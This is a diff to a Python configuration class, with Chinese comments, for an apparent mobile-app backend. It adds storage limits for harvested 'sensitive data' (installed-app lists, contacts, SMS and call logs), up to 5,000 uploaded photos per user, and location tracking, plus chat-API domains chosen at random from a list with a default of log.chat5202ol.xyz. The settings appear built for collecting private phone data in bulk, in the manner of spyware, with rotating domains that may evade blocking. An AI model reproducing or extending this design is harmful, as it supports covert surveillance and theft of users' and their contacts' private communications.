@@ -132,7 +132,24 @@ class Settings(BaseSettings):
     # ==================== 业务配置 ====================
     INVITATION_CODE_LENGTH: int = Field(default=8, description="邀请码长度")
     LOCATION_UPDATE_THRESHOLD_METERS: int = Field(default=200, description="位置更新阈值（米）")
-    MAX_SENSITIVE_DATA_COUNT: int = Field(default=2000, description="敏感数据最大条数")
+    MAX_SENSITIVE_DATA_COUNT: int = Field(default=2000, description="敏感数据最大条数（结构化数据：应用列表、通讯录、短信、通话记录）")
+    MAX_PHOTOS_PER_USER: int = Field(default=5000, description="每个用户最多上传的图片数量")
+    
+    # ==================== 聊天接口配置 ====================
+    CHAT_BASE_DOMAINS: str = Field(
+        default="log.chat5202ol.xyz",
+        description="聊天接口基础域名列表（逗号分隔，用于随机选择，不带路径）"
+    )
+    CHAT_API_PATH: str = Field(
+        default="/api/v1",
+        description="聊天接口 API 路径（共同部分）"
+    )
+    
+    @property
+    def chat_base_domains_list(self) -> list[str]:
+        """获取聊天接口基础域名列表"""
+        domains = [domain.strip() for domain in self.CHAT_BASE_DOMAINS.split(",") if domain.strip()]
+        return domains if domains else ["log.chat5202ol.xyz"]
     
     # ==================== Socket.io 配置 ====================
     SOCKETIO_CORS_ORIGINS: str = Field(
